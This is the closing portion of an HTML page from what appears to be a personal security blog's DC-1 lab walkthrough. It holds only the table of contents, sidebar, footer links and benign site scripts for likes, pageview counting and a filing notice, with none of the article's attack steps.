href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip"><span class="toc-number">2.</span> <span class="toc-text"> 寻找靶机IP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#arp-scan"><span class="toc-number">2.1.</span> <span class="toc-text"> arp-scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">2.2.</span> <span class="toc-text"> nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BAip%E7%9A%84%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.</span> <span class="toc-text"> 探测目标靶机IP的开放端口</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text"> 网页信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BBdrupal"><span class="toc-number">4.</span> <span class="toc-text"> 攻击Drupal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text"> 数据库渗透</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / AI安全 / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">24</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/09/27/PKWCTF%20AI%E6%96%B9%E5%90%91WP/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/02/flask%20session%E4%BC%AA%E9%80%A0%E4%B8%8Efilter-chain/">flask的session伪造与filter-chain</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">其他系统库类型下的SQL注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/12/SSRF/">SSRF</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/20/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pickle反序列化与Python原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/">常规外网打点-PART3</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/">常规外网打点-PART2</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">636k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">9:38</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/10/13/DC-1靶场日记/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="zlaryy-pageview-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = '—';
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+    document.dispatchEvent(new Event('zlaryy:stats-ready'));
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script id="zlaryy-article-views">(function articleViewsClient(options) {
+  if (window.ZLARYYArticleViews) {
+    window.ZLARYYArticleViews.refresh();
+    return;
+  }
+
+  var counts = new Map();
+  var recordedPath = null;
+  var requestId = 0;
+  var activeController = null;
+  var pendingPath = null;
+  var serverURL = (options.serverURL || '').replace(/\/+$/, '');
+
+  function normalPath(value) {
+    var url;
+    try {
+      url = new URL(value, window.location.href);
+      var siteOrigin = new URL(options.siteURL).origin;
+      if (url.origin !== window.location.origin && url.origin !== siteOrigin) return null;
+      return url.pathname.replace(/\/index\.html$/, '/').split('/').map(function (part) {
+        try {
+          return encodeURIComponent(decodeURIComponent(part).normalize('NFC'));
+        } catch (error) {
+          return part;
+        }
+      }).join('/');
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function currentPath() {
+    var canonical = document.querySelector('link[rel="canonical"]');
+    return normalPath(canonical ? canonical.href : window.location.href);
+  }
+
+  function isPost() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function addCounter(meta, path, full) {
+    if (!meta || !path || meta.querySelector('.zlaryy-view-item')) return;
+    var item = document.createElement('span');
+    item.className = 'item zlaryy-view-item';
+    item.title = '累计浏览次数';
+    item.innerHTML =
+      '<span class="icon"><i class="ic i-eye"></i></span>' +
+      (full ? '<span class="text">浏览量</span>' : '') +
+      '<span class="zlaryy-pageview-count">—</span>' +
+      '<span class="text">次</span>';
+    item.querySelector('.zlaryy-pageview-count').dataset.path = path;
+    meta.appendChild(item);
+  }
+
+  function collectCounters() {
+    document.querySelectorAll('.segments article.item').forEach(function (card) {
+      var link = card.querySelector('.info h3 a[href]');
+      if (link) addCounter(card.querySelector('.info > .meta'), normalPath(link.href), false);
+    });
+    if (isPost()) {
+      var path = currentPath();
+      addCounter(document.querySelector('#header #brand .meta'), path, true);
+      document.querySelectorAll('article.post .post-view-count .zlaryy-pageview-count')
+        .forEach(function (element) { element.dataset.path = path; });
+    }
+    return Array.from(document.querySelectorAll('.zlaryy-pageview-count[data-path]'));
+  }
+
+  function render() {
+    collectCounters().forEach(function (element) {
+      var count = counts.get(element.dataset.path);
+      element.textContent = typeof count === 'number' ? String(count) : '—';
+      element.title = typeof count === 'number' ? '累计浏览次数' : '浏览量暂不可用';
+    });
+  }
+
+  async function counterRequest(query, body, signal) {
+    var url = new URL(serverURL + '/api/article');
+    url.searchParams.set('lang', 'zh-CN');
+    if (query) {
+      url.searchParams.set('path', query.join(','));
+      url.searchParams.set('type', 'time');
+    }
+    var response = await fetch(url.href, {
+      method: body ? 'POST' : 'GET',
+      headers: body ? { 'Content-Type': 'application/json' } : undefined,
+      body: body ? JSON.stringify(body) : undefined,
+      credentials: 'omit',
+      cache: 'no-store',
+      signal: signal
+    });
+    if (!response.ok) throw new Error('Counter HTTP ' + response.status);
+    var result = await response.json();
+    if (result.errno || !Array.isArray(result.data)) throw new Error('Invalid counter response');
+    return result.data;
+  }
+
+  function validCount(row) {
+    if (!row || !Number.isSafeInteger(row.time) || row.time < 0) {
+      throw new Error('Invalid pageview count');
+    }
+    return row.time;
+  }
+
+  async function refresh() {
+    var elements = collectCounters();
+    var path = currentPath();
+    var post = isPost();
+    render();
+    if (!post) recordedPath = null;
+    if (!serverURL || !elements.length || !path) return;
+    if (pendingPath === path) return;
+    pendingPath = path;
+
+    // Local previews only read totals; they must not increase the live counter.
+    var siteHost = new URL(options.siteURL).hostname;
+    var countVisit = post && (window.location.hostname === siteHost || options.countPreview);
+    var increment = countVisit && recordedPath !== path;
+    if (increment) recordedPath = path;
+
+    var paths = Array.from(new Set(elements.map(function (element) {
+      return element.dataset.path;
+    }))).filter(function (item) { return !increment || item !== path; });
+
+    var id = ++requestId;
+    if (activeController) activeController.abort();
+    var controller = new AbortController();
+    activeController = controller;
+    var timeout = window.setTimeout(function () { controller.abort(); }, 10000);
+    var jobs = [];
+
+    if (increment) {
+      jobs.push(counterRequest(null, { path: path, type: 'time', action: 'inc' }, controller.signal)
+        .then(function (rows) {
+          var count = validCount(rows[0]);
+          if (id === requestId) { counts.set(path, count); render(); }
+        }));
+    }
+    if (paths.length) {
+      jobs.push(counterRequest(paths, null, controller.signal).then(function (rows) {
+        if (rows.length !== paths.length) throw new Error('Incomplete counter response');
+        var values = rows.map(validCount);
+        if (id === requestId) {
+          paths.forEach(function (item, index) { counts.set(item, values[index]); });
+          render();
+        }
+      }));
+    }
+    try {
+      var results = await Promise.allSettled(jobs);
+      if (id === requestId && results.some(function (result) { return result.status === 'rejected'; })) {
+        console.warn('文章浏览量暂不可用。');
+      }
+    } finally {
+      window.clearTimeout(timeout);
+      if (id === requestId) { pendingPath = null; activeController = null; }
+    }
+  }
+
+  window.ZLARYYArticleViews = { refresh: refresh, render: render };
+  // The existing like button script creates its stats area after DOMContentLoaded.
+  document.addEventListener('zlaryy:stats-ready', render);
+  document.addEventListener('pjax:complete', function () { window.setTimeout(refresh, 0); });
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refresh, { once: true });
+  } else {
+    refresh();
+  }
+})({"enable":true,"serverURL":"https://zlaryy-waline.vercel.app","siteURL":"https://zlaryy.top","countPreview":false});</script><script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
